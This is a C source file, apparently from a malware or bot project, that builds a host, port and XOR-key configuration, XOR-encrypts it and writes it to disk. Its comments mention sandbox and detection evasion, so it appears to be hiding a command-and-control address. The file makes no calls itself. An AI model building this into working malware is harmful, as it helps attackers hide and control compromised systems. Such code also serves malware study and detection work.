/*-----------------------------------------------------------------------\
| Copyright (C) 2018  Lilly Chalupowski                                  |
|                                                                        |
| This program is free software: you can redistribute it and/or modify   |
| it under the terms of the GNU General Public License as published by   |
| the Free Software Foundation, either version 3 of the License, or      |
| (at your option) any later version.                                    |
|                                                                        |
| This program is distributed in the hope that it will be useful,        |
| but WITHOUT ANY WARRANTY; without even the implied warranty of         |
| MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the          |
| GNU General Public License for more details.                           |
|                                                                        |
| You should have received a copy of the GNU General Public License      |
| along with this program.  If not, see <https://www.gnu.org/licenses/>. |
\-----------------------------------------------------------------------*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include "../defs.h"
#include "crypt.h"

config *config_create(char * host,
                      int host_port,
                      int xor_key){
  /*
    :TODO: write config to memory pointer
    :host_port: host port
    :host: host domain name or ip address
    :sandbox_evasion: sandbox evasion
    :detection_evasion: detection evasion
    :returns: pointer to configuration data
  */
  config *p_config = malloc(sizeof(config));
  p_config->host_port = host_port;
  if (strlen(host) > MAX_DOMAIN_LEN){
    fprintf(stderr, "error: config host exceeds max domain length\n");
    exit(EXIT_FAILURE);
  } else{
    strncpy(p_config->host, host, strlen(host));
  }
  p_config->xor_key = xor_key;
  return p_config;
}

bool config_write(char *config_path,
                  char *host,
                  int host_port,
                  int xor_key){
  /*
    :TODO: write configuration to file
    :host_port: host port
    :host: domain name or ip address
    :sandbox_evasion: sandbox evasion
    :detection_evasion: detection evasion
    :returns: bool
  */
  config *p_config_host = config_create(host,
                                        host_port,
                                        xor_key);
  crypt_encrypt_xor_config(p_config_host, sizeof(config), xor_key);
  FILE *fp;
  fp = fopen(config_path, "w");
  fwrite(p_config_host,
         sizeof(config),
         1,
         fp);
  fclose(fp);
  free(p_config_host);
  return true;
}
